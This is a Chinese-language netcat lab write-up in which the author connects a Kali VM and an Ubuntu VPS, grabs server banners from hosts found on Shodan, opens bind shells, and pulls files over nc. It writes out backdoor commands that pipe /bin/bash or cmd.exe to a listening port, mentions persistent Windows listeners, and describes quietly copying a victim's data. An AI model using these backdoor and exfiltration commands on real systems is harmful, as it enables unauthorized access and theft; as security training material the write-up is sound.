## 实验1 - 使用Netcat在本地Kali主机上监听公网Ubuntu的连接
为了展示 netcat 将会使用两台主机。
1. Kali linux 虚拟机
2. Ubuntu vps 

Ubuntu vps:
![title](https://leanote.com/api/file/getImage?fileId=5d9eccb2ab64415a49000ad1)

**在公网 UBUNTU 上：**
![title](https://leanote.com/api/file/getImage?fileId=5d9eccfeab64415c47000a40)
这行命令表示监听本机的8888端口。

**在 Kali 上：**
![title](https://leanote.com/api/file/getImage?fileId=5d9ecd23ab64415c47000a43)
这行命令表示与公网 ip 为 144.168.*.70的主机进行通信。

在其他基于Debian的操作系统上：`apt-get netcat`

然后尝试在两边的命令行里面输入命令，结果发现另一个命令行都能看到输出：

Ubuntu:
![title](https://leanote.com/api/file/getImage?fileId=5d9ecd5cab64415a49000ad5)

Kali:
![title](https://leanote.com/api/file/getImage?fileId=5d9ecd6cab64415a49000ad7)

上面就是使用Netcat在远程Ubuntu系统上创建了一个侦听器。然后在本地Kali系统上的端口8888（可以是任何端口）上打开了Netcat侦听器。

## 实验2 - 使用Netcat进行Banner抓取以进行OS指纹识别
在攻击任何系统之前，我们需要尽可能多地了解目标。因此，一旦我们与Web服务器建立了TCP连接，就可以使用Netcat抓住已提供新连接的Web服务器的标识，以识别目标正在运行的Web服务软件。

可以使用`HEAD / HTTP/1.0`命令将Banner抓取到Web服务器。请注意并完全按照斜杠和空格进行复制。或者，如果这不起作用，则可以改用 `HEAD / HTTP/1.1` 。

实验：
先在shodan上面找一个nginx的主机：
![title](https://leanote.com/api/file/getImage?fileId=5d9ecd94ab64415c47000a46)

然后抓取banner。在我的kali输入:
![title](https://leanote.com/api/file/getImage?fileId=5d9ecdadab64415a49000ad9)
可以看到抓回的信息显示web服务器是nginx。记得多按几次回车。

再在shodan上面找一个apache的主机：
![title](https://leanote.com/api/file/getImage?fileId=5d9ecdd7ab64415c47000a48)

![title](https://leanote.com/api/file/getImage?fileId=5d9ece01ab64415a49000adb)

总之都可以找出它们正在运行的服务器，获取服务器信息。


## 实验3 - reverse shell
在公网 Ubuntu 上面输入下列命令，结果报错了：
![title](https://leanote.com/api/file/getImage?fileId=5d9ece26ab64415c47000a49)

修复： https://www.fengdingbo.com/netcat-invalid-option-e.html
我自己一不小心把nc删了，重新`apt-get install netcat`了一遍就好了。
![title](https://leanote.com/api/file/getImage?fileId=5d9ece49ab64415c47000a4a)

在kali上面开始监听此Ubuntu vps的6996端口：
![title](https://leanote.com/api/file/getImage?fileId=5d9ece6aab64415a49000adc)

在kali的命令行里面尝试输入命令：
![title](https://leanote.com/api/file/getImage?fileId=5d9ece83ab64415c47000a4b)

就会发现这其实是Ubuntu的bash，所以我们在kali这里获取了一个Ubuntu的反弹shell。

Netcat Reverse shell 原理：
![title](https://leanote.com/api/file/getImage?fileId=5d9eceabab64415a49000ade)

Normal Shell VS Reverse Shell：
![title](https://leanote.com/api/file/getImage?fileId=5d9ececcab64415c47000a4c)



## 实验4 - Windows主机环境下
windows环境下netcat的安装及使用：https://blog.csdn.net/qq_37585545/article/details/82250984

Windows 命令行：
![title](https://leanote.com/api/file/getImage?fileId=5d9ecf0fab64415c47000a4e)

Windows 机器的 IPv4 地址：
![title](https://leanote.com/api/file/getImage?fileId=5d9ecf33ab64415c47000a4f)

- 创建 listener：<br/>
![title](https://leanote.com/api/file/getImage?fileId=5d9ecf5dab64415a49000ae4)

成功建立监听。可以交流。

`注意：`请注意，在Windows系统上，我们可以使用大写L运行相同的命令，以创建即使系统重新启动也将打开的持久侦听器！！！

- 建立后门

现在，让我们在目标系统上创建一个后门，以便我们可以随时返回该后门。根据我们攻击的是Linux还是Windows系统，该命令会略有不同。前面已经说过linux的命令为：
```nc -l -p 6996 -e /bin/bash```

Windows的命令为：
```nc -l -p 6996 -e cmd.exe```

**实验:**
在模拟受害主机Windows系统的命令行中：
![title](https://leanote.com/api/file/getImage?fileId=5d9ecf88ab64415a49000ae6)

在模拟攻击机器Kali的命令行中：
![title](https://leanote.com/api/file/getImage?fileId=5d9ecfa8ab64415a49000aef)

很明显我们获取了 Windows 主机的反弹 shell。Windows 命令提示符已通过 Netcat 连接直接通过管道传递到 Kali 攻击系统。我们拥有了那个shell!

总结来说，这行命令将在系统上打开一个 listener，该 listener 会将命令行 bash shell 程序或 Linux bash shell 程序 “pipe” 到连接系统。


## 实验5 - 通过NC提取（复制）受害系统上的文件

Netcat还可以用于从目标中提取文件和数据。假设我们需要目标系统上的数据，例如财务数据或数据库中存储的数据。我们可以使用隐身连接将数据缓慢复制到攻击系统中。

### Linux 环境
因为我们的Ubuntu在公网上，Kali 虚拟机在内网里，无法出网。所以此实验的场景为：把公网Ubuntu上面的try.txt文件通过netcat传输到本地的Kali虚拟机上。

首先在Ubuntu上创建一个try.txt:
![title](https://leanote.com/api/file/getImage?fileId=5d9ecfdfab64415c47000a50)

然后看看在我们的Kali本地机器上是没有这个try.txt的：
![title](https://leanote.com/api/file/getImage?fileId=5d9ecffcab64415a49000af1)

然后在公网Ubuntu机器上开启一个nc传输：
`cat '/root/try.txt' | nc -l -p 9999`
这句命令的意思是：查看 try.txt 的内容，然后通过管道把这个结果写入本地9999端口通过nc传输。
![title](https://leanote.com/api/file/getImage?fileId=5d9ed01cab64415c47000a51)

然后在本地kali机器上开始监听此公网Ubuntu的9999端口：
`nc 144.168.*.70 9999 > try.txt`
这句命令的意思是，监听公网 IP 为 144.168.*.70 的主机（即此Ubuntu主机）的9999端口，把监听到的结果写入  `try.txt`。
![title](https://leanote.com/api/file/getImage?fileId=5d9ed03cab64415c47000a52)

再在Kali终端上新开一个terminal查看接收到的文件：
![title](https://leanote.com/api/file/getImage?fileId=5d9ed05cab64415c47000a53)

发现已经接收到了。

### Windows 环境
Windows:
![title](https://leanote.com/api/file/getImage?fileId=5d9ed08bab64415c47000a54)

Kali：
![title](https://leanote.com/api/file/getImage?fileId=5d9ed0adab64415c47000a55)

![title](https://leanote.com/api/file/getImage?fileId=5d9ed0baab64415c47000a56)

`注意：`windows 里面查看文件命令为 `type` 而不是 `cat`，也可以通过这种方法来传递其他格式的文件比如  xls、csv 等等。


## 实验6 - 内网端口转发与公网VPS通信

如果在内网里面的机器想要通过netcat进行通信，让处于公网里的VPS进行监听，就必须进行内网端口转发/内网穿透。

但是一定要注意一个误区就是：端口转发≠内网穿透！

此部分因为方法众多，故单独成文。

-----------

参考链接：
[1] [Use Netcat to Spawn Reverse Shells & Connect to Other Computers [Tutorial]](https://www.youtube.com/watch?v=VF4In6rIPGc)，Youtube，2018年12月7日
[2] [How to Use Netcat, the Swiss Army Knife of Hacking Tools](https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-netcat-swiss-army-knife-hacking-tools-0148657/)，NULL BYTE，2018年12月8日
